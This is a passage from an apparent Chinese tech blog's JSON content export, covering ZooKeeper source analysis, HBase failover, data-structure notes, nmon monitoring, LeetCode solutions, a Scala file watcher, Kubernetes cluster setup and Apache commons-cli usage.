OpCode.sync: case OpCode.exists: case OpCode.getData: case OpCode.getACL: case OpCode.getChildren: case OpCode.getChildren2: case OpCode.ping: case OpCode.setWatches: zks.sessionTracker.checkSession(request.sessionId, request.getOwner()); break; default: LOG.warn(\"unknown type \" + request.type); break; &#125; &#125; catch (KeeperException e) &#123; if (request.hdr != null) &#123; request.hdr.setType(OpCode.error); request.txn = new ErrorTxn(e.code().intValue()); &#125; LOG.info(\"Got user-level KeeperException when processing \" + request.toString() + \" Error Path:\" + e.getPath() + \" Error:\" + e.getMessage()); request.setException(e); &#125; catch (Exception e) &#123; // log at error level as we are returning a marshalling // error to the user LOG.error(\"Failed to process \" + request, e); StringBuilder sb = new StringBuilder(); ByteBuffer bb = request.request; if(bb != null)&#123; bb.rewind(); while (bb.hasRemaining()) &#123; sb.append(Integer.toHexString(bb.get() &amp; 0xff)); &#125; &#125; else &#123; sb.append(\"request buffer is null\"); &#125; LOG.error(\"Dumping request buffer: 0x\" + sb.toString()); if (request.hdr != null) &#123; request.hdr.setType(OpCode.error); request.txn = new ErrorTxn(Code.MARSHALLINGERROR.intValue()); &#125; &#125; request.zxid = zks.getZxid(); nextProcessor.processRequest(request); &#125; 主要是根据 Request 的 type 来判断处理不同的请求,具体的请求不深入说明了. 小结至此,zookeeper 单机启动的方式已经做了大概的描述，当然内部还有很多其他的细节没有涉及到。 JDK NIO 的方式比较复杂,需要频繁设置读取位置。Netty 的实现方式比较简洁,这里也没有做具体的说明. 请求接收和响应是核心以及 jute 的序列化. 线程安全的保证、读写锁、volatile 保证变量对线程的可见性. 参考资料 Slf4j MDC 详解 zookeeper 官网","updated":"2020-07-19T00:23:27.844Z","tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://xwolf191.github.io/tags/zookeeper/"}]},{"title":"zookeeper源码分析一之源码环境搭建","date":"2019-04-06T02:40:00.000Z","path":"2019/04/06/distributed/zookeeper源码分析一之源码环境搭建/","text":"本节以zookeer 3.4.14来分析源码,IDE为IDEA,eclipse也可以。 前提 jdk1.8 Apache Ant安装配置 Apache Maven安装配置 环境配置下载编译源码12345678## 下载源码$ git clone -b branch-3.4.14 https://github.com/apache/zookeeper.git$ cd zookeeper# ant 编译$ ant # 如果有eclispe,编译为eclipse项目$ ant eclipse 导入ideaidea 导入为maven项目即可.最终的包结构信息:12345678910111213141516171819202122232425262728293031323334353637383940414243444546D:.├─.revision├─bin 命令集合├─build ant构建后目录│ ├─conf zk配置信息├─src│ ├─zookeeper-client C客户端│ └─zookeeper-client-c│ ├─zookeeper-contrib 贡献工具集合│ ├─zookeeper-contrib-fatjar fatjar│ │ │ ├─zookeeper-contrib-huebrowser zkui图形化工具│ │ │ ├─zookeeper-contrib-loggraph 日志查看和过滤工具│ ├─zookeeper-contrib-monitoring 监控工具│ │ │ ├─zookeeper-contrib-rest rest接口│ │ │ ├─zookeeper-contrib-zkfuse zkfuse工具,将zk挂载到文件系统│ │ └─src│ ├─zookeeper-contrib-zkperl perl客户端│ │ │ ├─zookeeper-contrib-zkpython python 客户端│ │ │ ├─zookeeper-contrib-zktreeutil zookeeper 操作工具│ │ │ └─zookeeper-contrib-zooinspector inspector工具│ ├─zookeeper-docs zookeeper文档│ ├─zookeeper-it 测试│ ├─zookeeper-jute jute序列化│ ├─zookeeper-recipes zk选举、锁和队列│ ├─zookeeper-recipes-election│ │ ├─zookeeper-recipes-lock│ │ └─zookeeper-recipes-queue│ └─zookeeper-server zk server 各个模块的结构还是很清晰的,不做过多解释. 启动server查看zkServer.sh 文件,可以看到server main入口. 1234# for some reason these two options are necessary on jdk6 on Ubuntu # accord to the docs they are not necessary, but otw jconsole cannot # do a local attach ZOOMAIN=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=$JMXLOCALONLY org.apache.zookeeper.server.quorum.QuorumPeerMain\" 指定zoo.cfg配置文件,运行org.apache.zookeeper.server.quorum.QuorumPeerMain.,看到日志信息的输出，表示启动成功，当然是单节点的。 启动 client直接启动org.apache.zookeeper.ZooKeeperMain.也可正常启动. 到此,zookeerp源码的调试环境已经ok。","updated":"2020-07-19T00:23:27.837Z","tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://xwolf191.github.io/tags/zookeeper/"}]},{"title":"Hbase backup-master自动切换","date":"2019-04-02T11:50:00.000Z","path":"2019/04/02/大数据/Hbase backup-master自动切换/","text":"启动 hbase 的时候,进入 shell 界面, hbase master 自动切换失败. hbase-site.xml 增加配置 1234&lt;property&gt;&lt;name&gt;hbase.unsafe.stream.capability.enforce&lt;/name&gt;&lt;value&gt;false&lt;/value&gt;&lt;/property&gt; 分发到各个节点，重启 hbase 集群.查看 zk 中 master 节点的信息此时，hadoop01 就是 master。 在 hadoop01 节点上执行命令,停止 hbase master 节点: 123[root@hadoop01 hbase-2.1.4]# /opt/bigdata/hbase-2.1.4/bin/hbase-daemon.sh stop masterrunning master, logging to /opt/bigdata/hbase-2.1.4/logs/hbase-root-master-hadoop01.outstopping master. 查看 zk 中 master 节点的信息: 此时,备用 master 成为 active 状态,zk 中记录为 hadoop02。","updated":"2020-07-19T00:23:27.956Z","tags":[{"name":"hbase","slug":"hbase","permalink":"http://xwolf191.github.io/tags/hbase/"}]},{"title":"gossip算法","date":"2019-04-01T06:00:00.000Z","path":"2019/04/01/distributed/gossip算法/","text":"参考资料 Gossip_protocol wiki","updated":"2020-07-19T00:23:27.814Z","tags":[{"name":"gossip","slug":"gossip","permalink":"http://xwolf191.github.io/tags/gossip/"}]},{"title":"trie树","date":"2019-03-31T08:40:00.000Z","path":"2019/03/31/数据结构和算法/trie树/","text":"简介[wiki]在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。 Trie这个术语来自于retrieval。根据词源学，trie的发明者Edward Fredkin把它读作/ˈtriː/ “tree”。但是，其他作者把它读作/ˈtraɪ/ “try”。 在图示中，键标注在节点中，值标注在节点之下。每一个完整的英文单词对应一个特定的整数。Trie可以看作是一个确定有限状态自动机，尽管边上的符号一般是隐含在分支的顺序中的。 键不需要被显式地保存在节点中。图示中标注出完整的单词，只是为了演示trie的原理。 trie中的键通常是字符串，但也可以是其它的结构。trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。比如，bitwise trie中的键是一串比特，可以用于表示整数或者内存地址。 参考资料 Trie","updated":"2020-07-19T00:23:28.044Z","tags":[{"name":"trie","slug":"trie","permalink":"http://xwolf191.github.io/tags/trie/"}]},{"title":"跳表(Skip List)","date":"2019-03-31T08:40:00.000Z","path":"2019/03/31/数据结构和算法/跳表(Skip List)/","text":"简介[wiki]跳跃列表是一种数据结构。它允许快速查询一个有序连续元素的数据链表。跳跃列表的平均查找和插入时间复杂度都是O(log n)，优于普通队列的O(n)。 快速查询是通过维护一个多层次的链表，且每一层链表中的元素是前一层链表元素的子集（见右边的示意图）。一开始时，算法在最稀疏的层次进行搜索，直至需要查找的元素在该层两个相邻的元素中间。这时，算法将跳转到下一个层次，重复刚才的搜索，直到找到需要查找的元素为止。跳过的元素的方法可以是随机性选择或确定性选择，其中前者更为常见。 参考资料 Skip List wiki","updated":"2020-07-19T00:23:28.052Z","tags":[{"name":"skip list","slug":"skip-list","permalink":"http://xwolf191.github.io/tags/skip-list/"}]},{"title":"nmon监控","date":"2019-03-29T01:50:00.000Z","path":"2019/03/29/linux/nmon监控/","text":"nmon 是一种在 AIX 与各种 Linux 操作系统上广泛使用的监控与分析工具，相对于其它一些系统资源监控工具来说，nmon 所记录的信息是比较全面的，它能在系统运行过程中实时地捕捉系统资源的使用情况，并且能输出结果到文件中，然后通过 nmon_analyzer 工具产生数据文件与图形化结果。 安装安装比较简单,直接 yum 安装即可. 1yum install nmon 使用监控输入 nmon 进入监控界面 通过键入提示的命令来查看不同的信息. CPU 键入 C 查看 cpu 信息 内存 disk IO 这里只列出上面的几个监控信息。 收集数据nmon 的命令信息: 1234567891011121314151617181920212223242526272829303132For Data-Collect-Mode Options -f spreadsheet output format [note: default -s300 -c288] output file is &lt;hostname&gt;_YYYYMMDD_HHMM.nmon -F &lt;filename&gt; same as -f but user supplied filename Not recommended as the default file name is perfect The other options in alphabetical order: -a Include Accelerator GPU stats -b Online only: for black and white mode (switch off colour) -c &lt;number&gt; The number of snapshots before nmon stops -d &lt;disks&gt; To set the maximum number of disks [default 256] Ignores disks if the systems has 100's of disk or the config is odd! -D Use with -g to add the Disk Wait/Service Time &amp; in-flight stats -f and -F See above -g &lt;filename&gt; User Defined Disk Groups (see above) - Data Capture: Generates BBBG &amp; DG lines -g auto See above but makes the file \"auto\" for you of just the disks like sda etc . -h This help output -I &lt;percent&gt; Set the ignore process &amp; disks busy threshold (default 0.1%) Don't save or show proc/disk using less than this percent -J Switch-off Journel Filesystem stats collection (can causes issues with aut omound NFS) -l &lt;dpl&gt; Disks per line in data capture to avoid spreadsheet width issues. Default 150. EMC=64. -m &lt;directory&gt; nmon changes to this directory before saving to file Useful when starting nmon via cron -M Adds MHz stats for each CPU thread. Some POWER8 model CPU cores can be d ifferent frequencies -N Include NFS Network File System for V2, V3 and V4 -p nmon outputs the PID when it starts. Useful in scripts to capture the PID for a later safe stop. -r &lt;runname&gt; Use in a benchmark to record the run details for later analysis [default h ostname] -R Old rrdtool format used by some - may be removed in the future. If you u se this email Nigel -s &lt;seconds&gt; Time between snap shots - with \"-c count\" decides duration of the data cap ture -t Include Top Processes in the output -T As -t plus it saves command line arguments in UARG section -U Include the Linux 10 CPU utilisation stats (CPUUTIL lines in the file) -V Print nmon version &amp; exit immediately -f 指定文件的格式 -s 采样的时间间隔 -c 总共采样时间 -m 指定文件存放的目录 用下面的命令才保存采样信息: 123456[root@hadoop01 ~]# nmon -s 1 -c 360 -f -m /opt/nmon[root@hadoop01 ~]# ll -h /opt/nmon/total 184K-rw-r--r-- 1 root root 134K Mar 29 10:16 hadoop01_190329_1014.nmon-rw-r--r-- 1 root root 46K Mar 29 10:21 hadoop01_190329_1021.nmon nmon analyser将 nmon 文件转化为 csv 文件, 12345678[root@hadoop01 nmon]# sort hadoop01_190329_1021.nmon &gt; hadoop01_190329_1021.csv[root@hadoop01 nmon]# ll -ahtotal 776Kdrwxr-xr-x 2 root root 104 Mar 29 10:39 .drwxr-xr-x. 7 root root 73 Mar 29 10:14 ..-rw-r--r-- 1 root root 134K Mar 29 10:16 hadoop01_190329_1014.nmon-rw-r--r-- 1 root root 319K Mar 29 10:39 hadoop01_190329_1021.csv-rw-r--r-- 1 root root 319K Mar 29 10:27 hadoop01_190329_1021.nmon 下载分析工具, 解压 nmon analyser v60.xlsm 这个文件就是分析工具,以为是个 exe 呢… 主界面就是这样,点击 Analyze nmon data 载入文件即可看到下面的统计信息: 参考资料 Nmon wiki nmon for Linux","updated":"2020-07-19T00:23:27.885Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"141. Linked List Cycle","date":"2019-03-23T11:30:00.000Z","path":"2019/03/23/数据结构和算法/leetcode/Linked List Cycle/","text":"123456789Given a linked list, determine if it has a cycle in it.To represent a cycle in the given linked list, we use an integer pos which represents the position (0-indexed) in the linked list where tail connects to. If pos is -1, then there is no cycle in the linked list.Example 1:Input: head = [3,2,0,-4], pos = 1Output: trueExplanation: There is a cycle in the linked list, where tail connects to the second node. 1234Example 2:Input: head = [1,2], pos = 0Output: trueExplanation: There is a cycle in the linked list, where tail connects to the first node. 1234Example 3:Input: head = [1], pos = -1Output: falseExplanation: There is no cycle in the linked list. Follow up: Can you solve it using O(1) (i.e. constant) memory? 题目描述题目比较简单,容易理解。判断一个线性链表是否有环,可能的话用O(1)的空间复杂度来解决。有两种方法： 第一种需要额外的空间,用Set来存放遍历过的链表,每次判断是否包含在Set中,如果包含即是有环链表。时间和空间复杂度都为O(n) 第二种方法空间复杂度为O(1),用两个快慢指针,一个为当前节点的下一个节点,另一个指针为下一个节点的下一个节点。如果这两个节点相同表示有环，否则为无环。 实现 第一种方法的实现python 12345678910111213141516171819202122232425class ListNode: def __init__(self, x): self.val = x self.next = Noneclass LinkedListCycle: def hasCycle(self, head): \"\"\" :type head: ListNode :rtype: bool \"\"\" if head is None: return False res = set() while head is not None: if head in res: return True else: res.add(head) head = head.next return False 第二种方法 123456789101112131415161718class LinkedListCycle: def hasCycle(self, head): \"\"\" :type head: ListNode :rtype: bool \"\"\" if head is None or head.next is None: return False slow = head fast = head.next while slow != fast: if fast is None or fast.next is None: return False slow = slow.next fast = fast.next.next return True 参考资料 141. Linked List Cycle","updated":"2020-07-19T00:23:28.029Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"WatchService监听文件变化","date":"2019-03-23T03:30:00.000Z","path":"2019/03/23/scala/WatchService监听文件变化/","text":"在一些系统中需要一些开关变量来控制一下功能的使用。通常可以配置DB,文件,配置中心等。本文以文件来说明,通过来监听文件的变化来实现配置变量的动态感知。用JDK7提供的WatchService来实现文件的监听,废话不多说直接上代码。 12345678910111213141516171819202122232425262728293031323334353637383940package com.xwolf.scala.bigdata.jdk.coreimport java.nio.file.&#123;FileSystems, Paths, StandardWatchEventKinds&#125;/** * @author xwolf */class FileWatchUtil &#123; /** * 为文件注册监听事件 * @param filePath 监听的文件目录 * @param fileName 监听的文件名称 */ def register(filePath:String,fileName:String):Unit = &#123; val path = Paths.get(filePath) val watchService = FileSystems.getDefault.newWatchService() // 注册监听事件 path.register(watchService, StandardWatchEventKinds.ENTRY_DELETE,StandardWatchEventKinds.ENTRY_MODIFY) val listener = new FileListener(watchService,fileName) //正常的容器环境下设置为守护线程 //listener setDaemon(true) listener start() //钩子线程，关闭watchservice Runtime.getRuntime.addShutdownHook(new Thread()&#123; override def run(): Unit = watchService.close() &#125;) &#125;&#125;object FileWatchUtil&#123; def main(args: Array[String]): Unit = &#123; val fileWatchUtil = new FileWatchUtil val path = \"C:\\\\var\" val fileName = \"config.proerties\" fileWatchUtil.register(path,fileName) &#125;&#125; 123456789101112131415161718192021222324252627package com.xwolf.scala.bigdata.jdk.coreimport java.nio.file.WatchServiceimport scala.collection.JavaConverters._/** * @author xwolf */class FileListener(watchService:WatchService,fileName:String) extends Thread&#123; override def run(): Unit = &#123; while (true) &#123; val watchKey = watchService take() for (event &lt;- watchKey.pollEvents().asScala)&#123; if (event.context().toString() == fileName)&#123; //todo 重新加载配置文件 println(\"监听文件变化...\") &#125; &#125; //重置 watchKey.reset() &#125; &#125;&#125;","updated":"2020-07-19T00:23:27.900Z","tags":[{"name":"scala","slug":"scala","permalink":"http://xwolf191.github.io/tags/scala/"}]},{"title":"26. Remove Duplicates from Sorted Array","date":"2019-03-21T06:25:00.000Z","path":"2019/03/21/数据结构和算法/leetcode/Remove Duplicates from Sorted Array/","text":"12345678910111213141516171819202122232425262728293031323334Given a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.Example 1:Given nums = [1,1,2],Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.It doesn&apos;t matter what you leave beyond the returned length.Example 2:Given nums = [0,0,1,1,1,2,2,3,3,4],Your function should return length = 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively.It doesn&apos;t matter what values are set beyond the returned length.Clarification:Confused why the returned value is an integer but your answer is an array?Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.Internally you can think of this:// nums is passed in by reference. (i.e., without making a copy)int len = removeDuplicates(nums);// any modification to nums in your function would be known by the caller.// using the length returned by your function, it prints the first len elements.for (int i = 0; i &lt; len; i++) &#123; print(nums[i]);&#125; 题目解读在不占用额外内存的情况下完成数组的去重。这里用两个变量 i,j 来指向原始数组和去重后数组的元素位置。当 i 和 j 指向的元素不等的时候即查找到非重复元素,然后 j+1,依次遍历到结束。 代码实现 scala 12345678910111213141516171819202122 /** * @author xwolf * @result accept * @tags Array * @date 2019-03-21 14:20 */object RemoveDuplicatesFromSortedArray &#123; def removeDuplicates(nums: Array[Int]): Int = &#123; if (nums == null || nums.length==0) return 0 var j = 0 for (i &lt;- 0 until nums.length)&#123; if (nums(i) != nums(j))&#123; j += 1 nums(j) = nums(i) &#125; &#125; j + 1 &#125;&#125; 直接看个图比较容易理解 参考资料 Remove Duplicates from Sorted Array In-place_algorithm","updated":"2020-07-19T00:23:28.035Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"k8s集群安装","date":"2019-03-20T01:00:00.000Z","path":"2019/03/20/devops/k8s集群安装/","text":"master 安装安装 kubernetes 的时候，需要安装 kubelet, kubeadm 等包，但 k8s 官网给的 yum 源是 packages.cloud.google.com，国内访问不了。修改配置使用 aliyun 的镜像源来下载 kubernetes: 12345678[root@bogon ~]# vim /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetes Repobaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpgenabled=1 安装 docker kubelet kubeadm kubectl kubernetes-cni 1yum install -y docker kubelet kubeadm kubectl kubernetes-cni 发现 kubectl 不能安装 1234567891011[root@bogon ~]# yum install ansible[root@bogon ~]# ansible all -k -m shell -a \"curl -O https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg &amp;&amp; rpm --import rpm-package-key.gpg\"SSH password: [WARNING]: Consider using the get_url or uri module rather than running 'curl'. If you need to use commandbecause get_url or uri is insufficient you can add 'warn: false' to this command task or set'command_warnings=False' in ansible.cfg to get rid of this message.192.168.19.127 | CHANGED | rc=0 &gt;&gt; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 975 100 975 0 0 165 0 0:00:05 0:00:05 --:--:-- 289 再次执行上边的命令安装 kubectl。安装成功后启动 docker,kubelet 并设置开启启动: 1234[root@hadoop01 ~]# systemctl enable docker &amp;&amp; systemctl start dockerCreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.[root@hadoop01 ~]# systemctl enable kubelet &amp;&amp; systemctl start kubeletCreated symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /etc/systemd/system/kubelet.service. 下面开始初始化 master 1kubeadm init --kubernetes-version=v1.13.0 —kubernetes-version 指定只用的 k8s 版本信息 出现下面的错误, cpu 核心数太低,因为用的虚拟机。直接修改 CPU 核心数。 /proc/sys/net/bridge/bridge-nf-call-iptables 内容不是 1，这是修改为 1 12echo 1 &gt; /proc/sys/net/bridge/bridge-nf-call-iptablesecho 1 &gt; /proc/sys/net/bridge/bridge-nf-call-ip6tables swap 禁用的问题,加上参数 —ignore-preflight-errors=Swap ，忽略这个错误 解决上述问题后，继续执行初始化命令: 1kubeadm init --kubernetes-version=v1.13.0 --ignore-preflight-errors=Swap 又出错了,如下信息. 显示超时，被墙了。这里采用先下载镜像，最后修改 tag 来解决这个问题，一定要保证版本的一致性。 1234567docker pull mirrorgooglecontainers/kube-apiserver-amd64:v1.13.0docker pull mirrorgooglecontainers/kube-controller-manager-amd64:v1.13.0docker pull mirrorgooglecontainers/kube-scheduler-amd64:v1.13.0docker pull mirrorgooglecontainers/kube-proxy-amd64:v1.13.0docker pull mirrorgooglecontainers/pause:3.1docker pull mirrorgooglecontainers/etcd-amd64:3.2.24docker pull coredns/coredns:1.2.6 修改 tag 信息. 1234567docker tag docker.io/mirrorgooglecontainers/kube-apiserver-amd64:v1.13.0 k8s.gcr.io/kube-apiserver:v1.13.0docker tag docker.io/mirrorgooglecontainers/kube-controller-manager-amd64:v1.13.0 k8s.gcr.io/kube-controller-manager:v1.13.0docker tag docker.io/mirrorgooglecontainers/kube-scheduler-amd64:v1.13.0 k8s.gcr.io/kube-scheduler:v1.13.0docker tag docker.io/mirrorgooglecontainers/kube-proxy-amd64:v1.13.0 k8s.gcr.io/kube-proxy:v1.13.0docker tag docker.io/mirrorgooglecontainers/pause:3.1 k8s.gcr.io/pause:3.1docker tag docker.io/mirrorgooglecontainers/etcd-amd64:3.2.24 k8s.gcr.io/etcd:3.2.24docker tag docker.io/coredns/coredns:1.2.6 k8s.gcr.io/coredns:1.2.6 再次执行初始化命令 1# kubeadm init --kubernetes-version=v1.13.0 --ignore-preflight-errors=Swap 显示如下信息表示初始化成功. 按照提示执行如下操作: 123[root@localhost ~]# mkdir -p $HOME/.kube[root@localhost ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config[root@localhost ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config 至此 master 已安装配置 OK,但是集群中没有可用的 Node 和网络配置。下面继续。 Node 安装执行在 master 初始化成功后的信息来加入子节点 1234567891011[root@hadoop02 ~]# kubeadm join 192.168.19.130:6443 --token 2w4n77.m9dopqud2y4usegr --discovery-token-ca-cert-hash sha256:6f2c3732e14a7d20bbd64f402640b1f31078c7bf3c3144792d49d407fe7ccc4e --ignore-preflight-errors=Swap[preflight] Running pre-flight checks [WARNING Swap]: running with swap on is not supported. Please disable swap [WARNING SystemVerification]: this Docker version is not on the list of validated versions: 18.09.3. Latest validated version: 18.06[discovery] Trying to connect to API Server \"192.168.19.130:6443\"[discovery] Created cluster-info discovery client, requesting info from \"https://192.168.19.130:6443\"[discovery] Requesting info from \"https://192.168.19.130:6443\" again to validate TLS against the pinned public key[discovery] Cluster info signature and contents are valid and TLS certificate validates against pinned roots, will use API Server \"192.168.19.130:6443\"[discovery] Successfully established connection with API Server \"192.168.19.130:6443\"[join] Reading configuration from the cluster...[join] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' 但是最后出现了下面的错误信息,kubelet 检查失败。 发现 kubelet 服务一直没启动起来 查看日志信息 tail -f /var/log/messages, 还是 swap 没有禁用的错误信息。修改 kubelet 参数信息后即可, 12[root@hadoop02 ~]# vim /etc/sysconfig/kubeletKUBELET_EXTRA_ARGS=\"--fail-swap-on=false\" 重启 kubelet 服务后发现服务已正常运行。 1234567891011[root@hadoop02 ~]# systemctl restart kubelet[root@hadoop02 ~]# systemctl status kubelet● kubelet.service - kubelet: The Kubernetes Node Agent Loaded: loaded (/etc/systemd/system/kubelet.service; enabled; vendor preset: disabled) Drop-In: /etc/systemd/system/kubelet.service.d └─10-kubeadm.conf Active: active (running) since Thu 2019-03-21 00:42:41 CST; 7s ago Docs: https://kubernetes.io/docs/ Main PID: 51971 (kubelet) Tasks: 20 Memory: 32.1M 再次执行加入集群的命令 1# kubeadm join 192.168.19.130:6443 --token 2w4n77.m9dopqud2y4usegr --discovery-token-ca-cert-hash sha256:6f2c3732e14a7d20bbd64f402640b1f31078c7bf3c3144792d49d407fe7ccc4e --ignore-preflight-errors=Swap 还是有错误文件已经存在了,并且端口被占用。杀掉进程、删除文件再次加入集群。 Node 节点加入 master 不需要启动 kubelet。 在 master 节点查看所有加入的 node. 12345[root@localhost ~]# kubectl get nodesNAME STATUS ROLES AGE VERSIONhadoop02 NotReady &lt;none&gt; 58m v1.13.4hadoop03 NotReady &lt;none&gt; 7s v1.13.4localhost NotReady master 125m v1.13.4 所有的节点状态都为 NotReady，因为网络没有配置 OK,下面就来配置网络。 网络配置kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml","updated":"2020-07-19T00:23:27.791Z","tags":[{"name":"k8s","slug":"k8s","permalink":"http://xwolf191.github.io/tags/k8s/"}]},{"title":"commons-cli交互命令行工具","date":"2019-03-19T07:30:00.000Z","path":"2019/03/19/java/commons-cli交互命令行工具/","text":"Apache Commons CLI 库提供了一个 API，用于解析传递给程序的命令行选项。它还能够打印详细说明命令行工具可用选项的帮助消息。Commons CLI 支持不同类型的选项： 类 POSIX 选项(ie. tar -zxvf foo.tar.gz) 类 GNU 选项(ie. du —human-readable —max-depth=1) 类 Java 选项(ie. java -Djava.awt.headless=true -Djava.net.useSystemProxies=true Foo) 带有附加值的短参数项 (ie. gcc -O2 foo.c) 单个连字符的长选项 (ie. ant -projecthelp) 经常看到的就是如下的样式: 123456789101112131415161718[root@bogon mysql]# dockerUsage: docker COMMANDA self-sufficient runtime for containersOptions: --config string Location of client config files (default \"/root/.docker\") -D, --debug Enable debug mode --help Print usage -H, --host list Daemon socket(s) to connect to (default []) -l, --log-level string Set the logging level (\"debug\", \"info\", \"warn\", \"error\", \"fatal\") (default \"info\") --tls Use TLS; implied by --tlsverify --tlscacert string Trust certs signed only by this CA (default \"/root/.docker/ca.pem\") --tlscert string Path to TLS certificate file (default \"/root/.docker/cert.pem\") --tlskey string Path to TLS key file (default \"/root/.docker/key.pem\") --tlsverify Use TLS and verify the remote -v, --version Print version information and quit 基础示例最近看了一下 RockerMQ 的源码,启动服务之前做了一系列命令行交互的操作。今天就来写个小 demo 了解一下基本的用法。废话不多说,直接上代码. 123456&lt;!--commons-cli--&gt;&lt;dependency&gt; &lt;groupId&gt;commons-cli&lt;/groupId&gt; &lt;artifactId&gt;commons-cli&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt;&lt;/dependency&gt; 一段模拟启动、停止服务的交互命令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146package com.xwolf.util;import java.util.Objects;import org.apache.commons.cli.CommandLine;import org.apache.commons.cli.CommandLineParser;import org.apache.commons.cli.DefaultParser;import org.apache.commons.cli.HelpFormatter;import org.apache.commons.cli.MissingArgumentException;import org.apache.commons.cli.Option;import org.apache.commons.cli.Options;/** * 命令行工具. * @author xwolf * */public class CommandLineUtil &#123; /** * 构建options. * @return 构造后的Options */ public static Options buildOptions() &#123; Options options = new Options(); options.addOption(\"h\", \"help\", false, \"Print help for this application\"); options.addOption(\"v\", \"version\", false, \"the version of the application\"); options.addOption(\"stop\", false, \"stop the server\"); options.addOption(\"restart\", false, \"restart the server\"); Option optionStart = Option.builder(\"start\").hasArg(). argName(\"port\").desc(\"start the server use this port\") .build(); options.addOption(optionStart); return options; &#125; /** * 显示帮助信息. * @param options */ public static void printHelp(Options options) &#123; HelpFormatter hf = new HelpFormatter(); hf.setWidth(100); hf.printHelp(\"CommandLine\",options); &#125; /** * 解析命令行参数 */ public static void parseLine(Options options, String[] args) &#123; CommandLineParser parser = new DefaultParser(); CommandLine line = null; try &#123; line = parser.parse(options, args); &#125; catch (MissingArgumentException e) &#123; printHelp(options); System.exit(1); &#125; catch (Exception e) &#123; e.printStackTrace(); System.exit(1); &#125; // 打印help信息 if (Objects.isNull(args) || Objects.isNull(line) || args.length == 0 || line.hasOption(\"h\") || line.hasOption(\"help\")) &#123; printHelp(options); System.exit(1); &#125; // start if (line.hasOption(\"start\")) &#123; int port = 8080; String portStr = line.getOptionValue(\"start\"); if (Objects.nonNull(portStr)) &#123; try &#123; port = Integer.parseInt(portStr); if (port &lt; 80 || port &gt; 65535) &#123; System.err.println(\"端口应为80-65535\"); System.exit(-1); &#125; &#125; catch (NumberFormatException e) &#123; System.err.println(\"端口应为80-65535\"); System.exit(-1); &#125; &#125; System.out.printf(\"服务已在%d端口启动!\",port); &#125; // stop if (line.hasOption(\"stop\")) &#123; System.out.println(\"stop the server\"); &#125; // restart if (line.hasOption(\"restart\")) &#123; System.out.println(\"restart the server\"); &#125; // version if (line.hasOption(\"v\") || line.hasOption(\"version\")) &#123; System.out.println(\"the server version is 0.0.1\"); &#125; &#125; /** * 主函数. * @param args 参数 */ public static void main(String[] args) &#123; parseLine(buildOptions(), args); &#125;&#125; 通过在 IDE 中配置参数来输出不同的信息。 参考资料 commons-cli usage","updated":"2020-07-19T00:23:27.851Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"k8s安装以及mysql安装实战","date":"2019-03-15T02:30:00.000Z","path":"2019/03/15/devops/k8s安装以及mysql安装实战/","text":"Kubernetes 是一个开源的，用于管理云平台中多个主机上的容器化的应用，Kubernetes 的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes 提供了应用部署，规划，更新，维护的一种机制。 Kubernetes 一个核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运行着（比如用户想让 apache 一直运行，用户不需要关心怎么去做，Kubernetes 会自动去监控，然后去重启，新建，总之，让 apache 一直提供服务），管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes 也系统提升工具以及人性化方面，让用户能够方便的部署自己的应用（就像 canary deployments）。 现在 Kubernetes 着重于不间断的服务状态（比如 web 服务器或者缓存服务器）和原生云平台应用（Nosql）,在不久的将来会支持各种生产云平台中的各种服务，例如，分批，工作流，以及传统数据库。在 Kubenetes 中，所有的容器均在 Pod 中运行,一个 Pod 可以承载一个或者多个相关的容器，在后边的案例中，同一个 Pod 中的容器会部署在同一个物理机器上并且能够共享资源。一个 Pod 也可以包含 O 个或者多个磁盘卷组（volumes）,这些卷组将会以目录的形式提供给一个容器，或者被所有 Pod 中的容器共享，对于用户创建的每个 Pod,系统会自动选择那个健康并且有足够容量的机器，然后创建类似容器的容器,当容器创建失败的时候，容器会被 node agent 自动的重启,这个 node agent 叫 kubelet,但是，如果是 Pod 失败或者机器，它不会自动的转移并且启动，除非用户定义了 replication controller。 用户可以自己创建并管理 Pod,Kubernetes 将这些操作简化为两个操作：基于相同的 Pod 配置文件部署多个 Pod 